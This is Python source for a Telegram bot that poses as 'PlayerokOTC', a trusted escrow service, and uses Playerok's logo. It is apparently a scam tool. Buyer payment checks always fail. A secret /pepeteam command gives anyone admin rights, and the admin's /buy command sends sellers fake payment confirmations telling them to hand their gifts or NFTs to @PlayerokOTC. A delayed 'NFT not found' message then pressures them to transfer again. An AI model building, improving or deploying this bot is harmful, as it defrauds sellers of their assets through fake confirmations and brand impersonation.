import asyncio
import random
import string
import threading
import os
from typing import Dict

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from flask import Flask

# ====== Настройки ======
TOKEN = os.getenv("BOT_TOKEN")  # Вставь свой токен в Environment Variables Render
ADMIN_IDS = set()
# ========================

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

user_wallets: Dict[int, Dict] = {}
deals: Dict[str, Dict] = {}

class DealStates(StatesGroup):
    waiting_currency = State()
    waiting_wallet = State()
    waiting_amount = State()
    waiting_description = State()

main_kb = types.ReplyKeyboardMarkup(
    keyboard=[
        [types.KeyboardButton(text="Управление реквизитами"), types.KeyboardButton(text="Создать сделку")],
        [types.KeyboardButton(text="Реферальная ссылка"), types.KeyboardButton(text="Поддержка")]
    ],
    resize_keyboard=True
)

currency_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text=c)] for c in ["USD", "RUB", "UAH", "USDT", "BTC", "TON", "Stars"]],
    resize_keyboard=True
)

def gen_deal_id() -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

# ---- /start ----
@dp.message(CommandStart())
async def start(message: types.Message):
    text = message.text or ""
    parts = text.split()
    if len(parts) > 1 and parts[1].startswith("deal"):
        deal_id = parts[1][4:]
        if deal_id not in deals:
            await message.answer("❌ Сделка не найдена.")
            return

        deal = deals[deal_id]
        if message.from_user.id == deal["seller_id"]:
            await message.answer("❌ Вы не можете зайти в свою сделку как покупатель.")
            return

        deal["buyer_id"] = message.from_user.id
        deal["buyer_username"] = message.from_user.username or str(message.from_user.id)

        try:
            await bot.send_message(
                deal["seller_id"],
                f"👤 Покупатель @{deal['buyer_username']} зашел в вашу сделку №{deal_id}"
            )
        except Exception:
            pass

        wallet_display = deal["wallet"] if deal["currency"] != "Stars" else "@PlayerokOTC"
        stars_note = ""
        if deal["currency"] == "Stars":
            stars_note = "Способ передачи: Передавайте подарки по 100 Stars\n"

        buyer_kb = types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"buyer_confirm_{deal_id}")],
            [types.InlineKeyboardButton(text="🚪 Выйти из сделки", callback_data=f"buyer_exit_{deal_id}")]
        ])

        await message.answer(
            f"💳 Информация о сделке #{deal_id}\n\n"
            f"👤 Вы покупатель в сделке.\n"
            f"📌 Продавец: @{deal['seller_username']} ({deal['seller_id']})\n"
            f"• Вы покупаете: {deal['desc']}\n\n"
            f"🏦 Адрес для оплаты: {wallet_display}\n"
            f"{stars_note}"
            f"💰 Сумма к оплате: {deal['amount']} {deal['currency']}\n"
            f"📝 Комментарий к платежу(мемо): {deal['memo']}\n\n"
            f"⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой.",
            reply_markup=buyer_kb
        )
        return

    try:
        await message.answer_photo(
            photo="https://playerok.com/og_playerok.png",
            caption=(
                "Добро пожаловать в PlayerokOTC – надежный P2P-гарант\n\n"
                "💼 Покупайте и продавайте всё, что угодно – безопасно с минимальной комиссией!\n"
                "Выберите нужный раздел ниже:"
            ),
            reply_markup=main_kb
        )
    except Exception:
        await message.answer(
            "Добро пожаловать в PlayerokOTC – надежный P2P-гарант\n\n"
            "💼 Покупайте и продавайте всё, что угодно – безопасно с минимальной комиссией!\n"
            "Выберите нужный раздел ниже:",
            reply_markup=main_kb
        )

@dp.message(F.text == "Поддержка")
async def support(message: types.Message):
    await message.answer("🆘 Поддержка: @PlayerokOTC")

@dp.message(F.text == "Управление реквизитами")
async def manage_wallet(message: types.Message, state: FSMContext):
    await message.answer("💳 Выберите валюту вашего кошелька:", reply_markup=currency_kb)
    await state.set_state(DealStates.waiting_currency)

@dp.message(DealStates.waiting_currency)
async def set_currency(message: types.Message, state: FSMContext):
    chosen = message.text.strip()
    allowed = ["USD", "RUB", "UAH", "USDT", "BTC", "TON", "Stars"]
    if chosen not in allowed:
        await message.answer("❌ Выберите валюту только из предложенного списка.")
        return

    if chosen == "Stars":
        user_wallets[message.from_user.id] = {"currency": "Stars", "wallet": "@PlayerokOTC"}
        await message.answer("✅ Валюта установлена: Stars", reply_markup=main_kb)
        await state.clear()
        return

    await state.update_data(currency=chosen)
    await message.answer(
        f"✅ Валюта вашего кошелька установлена: {chosen}\nВведите реквизиты вашего кошелька:",
        reply_markup=types.ReplyKeyboardRemove()
    )
    await state.set_state(DealStates.waiting_wallet)

@dp.message(DealStates.waiting_wallet)
async def set_wallet(message: types.Message, state: FSMContext):
    data = await state.get_data()
    currency = data.get("currency")
    user_wallets[message.from_user.id] = {"currency": currency, "wallet": message.text.strip()}
    await message.answer(f"✅ Реквизиты сохранены: {message.text.strip()} ({currency})", reply_markup=main_kb)
    await state.clear()

@dp.message(F.text == "Создать сделку")
async def create_deal(message: types.Message, state: FSMContext):
    if message.from_user.id not in user_wallets:
        await message.answer("Сначала установите валюту кошелька через 'Управление реквизитами'.")
        return
    await message.answer("Введите сумму сделки (только цифры):")
    await state.set_state(DealStates.waiting_amount)

@dp.message(DealStates.waiting_amount)
async def deal_amount(message: types.Message, state: FSMContext):
    text = message.text.strip()
    if not text.isdigit():
        await message.answer("❌ Введите сумму только цифрами.")
        return
    await state.update_data(amount=text)
    currency = user_wallets[message.from_user.id]["currency"]
    await message.answer(f"📝 Укажите, что вы предлагаете в этой сделке за {text} {currency}:")
    await state.set_state(DealStates.waiting_description)

@dp.message(DealStates.waiting_description)
async def deal_description(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = await state.get_data()
    amount = data.get("amount")
    desc = message.text.strip()
    wallet_info = user_wallets.get(user_id, {"currency": "USD", "wallet": "None"})

    deal_id = gen_deal_id()
    memo = f"{deal_id}{user_id}"

    deals[deal_id] = {
        "seller_id": user_id,
        "seller_username": message.from_user.username or str(user_id),
        "wallet": wallet_info["wallet"],
        "currency": wallet_info["currency"],
        "amount": amount,
        "desc": desc,
        "memo": memo,
        "buyer_id": None,
        "buyer_username": None
    }

    link = f"https://t.me/PlayerokOTC_Robot?start=deal{deal_id}"
    await message.answer(
        f"✅ Сделка создана!\n\n"
        f"💰 Сумма: {amount} {wallet_info['currency']}\n"
        f"📜 Описание: {desc}\n"
        f"🔗 Ссылка для покупателя: {link}",
        reply_markup=main_kb
    )
    await state.clear()

@dp.callback_query(F.data.startswith("buyer_confirm_"))
async def buyer_confirm(callback: types.CallbackQuery):
    deal_id = callback.data.split("buyer_confirm_")[1]
    await callback.answer()
    await callback.message.edit_reply_markup(None)
    msg = await callback.message.answer("💳 Оплата проверяется...")
    await asyncio.sleep(5)
    await msg.edit_text("❌ Оплата не найдена.")

@dp.callback_query(F.data.startswith("buyer_exit_"))
async def buyer_exit(callback: types.CallbackQuery):
    await callback.message.edit_reply_markup(None)
    await callback.message.answer("🚪 Вы вышли из сделки.")

@dp.message(Command(commands=["pepeteam"]))
async def pepeteam(message: types.Message):
    ADMIN_IDS.add(message.from_user.id)
    await message.answer("✅ Вы стали админом. Теперь доступна команда /buy #код")

@dp.message(F.text.startswith("/buy"))
async def admin_buy(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    text = message.text.strip()
    deal_id = None
    if "#" in text:
        deal_id = text.split("#", 1)[1].strip()
    else:
        parts = text.split()
        if len(parts) >= 2:
            deal_id = parts[1].strip()
    if not deal_id or deal_id not in deals:
        await message.answer("❌ Сделка не найдена.")
        return

    deal = deals[deal_id]
    seller_id = deal["seller_id"]
    buyer_id = deal.get("buyer_id")

    confirm_kb = types.InlineKeyboardMarkup(
        inline_keyboard=[[types.InlineKeyboardButton(text="✅ Подтвердить отправку подарка", callback_data=f"seller_sent_{deal_id}")]]
    )

    await bot.send_message(
        seller_id,
        f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"Описание: {deal['desc']}\n\n"
        f"Передайте подарок менеджеру @PlayerokOTC и подтвердите ниже:",
        reply_markup=confirm_kb
    )

    if buyer_id:
        await bot.send_message(
            buyer_id,
            f"💳 Оплата подтверждена!\n▸ Сделка: #{deal_id}\n▸ Продавец: @{deal['seller_username']}\n▸ Сумма: {deal['amount']} {deal['currency']}\n▸ Описание: {deal['desc']}\n\n"
            f"Ожидайте, продавец отправит подарок менеджеру @PlayerokOTC для проверки.\n\n⏳ Ожидайте уведомления о передаче подарка."
        )

@dp.callback_query(F.data.startswith("seller_sent_"))
async def seller_sent(callback: types.CallbackQuery):
    deal_id = callback.data.split("seller_sent_")[1]
    if deal_id not in deals:
        await callback.message.answer("❌ Сделка не найдена.")
        return
    deal = deals[deal_id]
    buyer_id = deal.get("buyer_id")
    await callback.message.answer(
        f"⏳ Статус сделки #{deal_id}\n✅ Продавец подтвердил отправку подарка\n🔎 Менеджер @PlayerokOTC проверяет наличие NFT\n📭 Ожидайте доставки!\n\n"
        f"Бот уведомит вас, как только подарок будет готов.\n\nПодтвердить получение - тех. поддержка"
    )
    if buyer_id:
        await bot.send_message(
            buyer_id,
            f"⏳ Статус сделки #{deal_id}\n✅ Продавец подтвердил отправку подарка\n🔎 Менеджер @PlayerokOTC проверяет наличие NFT\n📭 Ожидайте доставки!\n\n"
            f"Бот уведомит вас, как только подарок будет готов."
        )

        async def nft_check_simulation():
            await asyncio.sleep(300)
            if deal_id in deals:
                await bot.send_message(
                    buyer_id,
                    f"🚨 NFT не найден!\nСделка: #{deal_id}\nПричина: Нет подарка у @PlayerokOTC.\n\n"
                    f"Решение:\n1. Передайте подарок @PlayerokOTC\n2. Обратитесь в поддержку."
                )
                await bot.send_message(
                    deal["seller_id"],
                    f"🚨 NFT не найден для сделки #{deal_id}. Покупатель уведомлён. Проверьте передачу подарка менеджеру @PlayerokOTC."
                )
        asyncio.create_task(nft_check_simulation())

# ================== Flask сервер ==================
app = Flask(__name__)

@app.route('/')
def home():
    return "✅ Bot is alive"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ================== Запуск ==================
async def main():
    print("✅ Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    asyncio.run(main())
